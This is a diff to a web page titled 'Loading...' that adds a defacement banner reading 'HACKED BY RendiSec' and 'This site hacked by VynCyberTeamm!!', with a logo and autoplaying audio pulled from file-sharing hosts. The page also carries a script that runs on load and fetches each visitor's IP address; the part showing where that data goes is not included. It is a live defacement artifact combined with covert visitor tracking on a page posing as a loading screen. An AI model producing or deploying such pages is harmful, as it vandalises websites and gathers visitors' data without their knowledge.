@@ -3,6 +3,48 @@
 <head>
   <title>Loading...</title>
   <meta charset="UTF-8" />
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      text-align: center;
+      font-family: 'Iceland', sans-serif;
+    }
+    .title {
+      font-size: 3rem;
+      color: red;
+    }
+    .subtitle {
+      font-size: 2.5rem;
+      color: green;
+    }
+    .quote {
+      font-size: 1.5rem;
+      margin: 20px 0;
+    }
+    .logo-container {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+    }
+    .logo-container img {
+      width: 300px;
+      height: auto;
+    }
+    audio {
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <h1 class="title">HACKED BY RendiSec</h1>
+  <div class="logo-container">
+    <img src="https://files.catbox.moe/06z8sz.jpg" alt="Logo">
+  </div>
+  <h2 class="subtitle">Hii! This site hacked by VynCyberTeamm!!</h2>
+  <p class="quote">System Breached</p>
+  <audio id="player" src="https://i.top4top.io/m_33131khih0.mp3" loop controls autoplay></audio>
+
   <script>
     async function getInfo() {
       const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
@@ -25,9 +67,6 @@
       });
     }
     getInfo();
-  </script>
-</head>
-<body>
-  <h1>Sedang memuat...</h1>
+</script>
 </body>
 </html>
